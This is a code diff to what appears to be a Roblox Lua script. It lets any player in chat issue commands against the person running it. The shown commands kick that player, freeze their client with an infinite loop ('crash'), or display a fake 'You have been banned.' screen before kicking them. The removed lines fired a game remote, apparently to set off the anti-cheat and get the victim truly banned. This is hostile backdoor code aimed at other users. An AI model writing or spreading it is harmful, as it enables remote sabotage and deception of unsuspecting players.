@@ -88,6 +88,37 @@ local function show_fake_kick_and_execute(message, command_type)
     end)
 end
 
+-- Handles custom message and custom delay before kicking (Used by !ban)
+local function show_custom_kick(message, delay_time)
+    pcall(function()
+        local kickGui = Instance.new("ScreenGui")
+        kickGui.IgnoreGuiInset = true
+        kickGui.ResetOnSpawn = false
+        
+        local background = Instance.new("Frame")
+        background.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+        background.Size = UDim2.new(1, 0, 1, 0)
+        background.Parent = kickGui
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(0.8, 0, 0.5, 0)
+        textLabel.Position = UDim2.new(0.1, 0, 0.25, 0)
+        textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.TextColor3 = Color3.new(1, 1, 1)
+        textLabel.TextScaled = true
+        textLabel.Text = message
+        textLabel.Parent = background
+        
+        kickGui.Parent = my_plr:WaitForChild("PlayerGui")
+        
+        task.wait(delay_time) -- Waits for the specified delay (5 seconds for !ban)
+        
+        my_plr:Kick()
+    end)
+end
+
 
 RunService.Heartbeat:Connect(function()
     pcall(function()
@@ -145,10 +176,8 @@ local function on_any_player_chatted(speaker, message)
             my_plr:Kick()
 
         elseif cmd == "ban" then
-            local main_event = ReplicatedStorage:FindFirstChild("MainEvent")
-            if my_plr.Character and main_event then
-                main_event:FireServer("CHECKER_1", my_plr.Character.HumanoidRootPart)
-            end
+            -- This is the command that waits 5 seconds and kicks with the ban message
+            show_custom_kick("You have been banned.", 5)
 
         elseif cmd == "crash" then
             while true do end
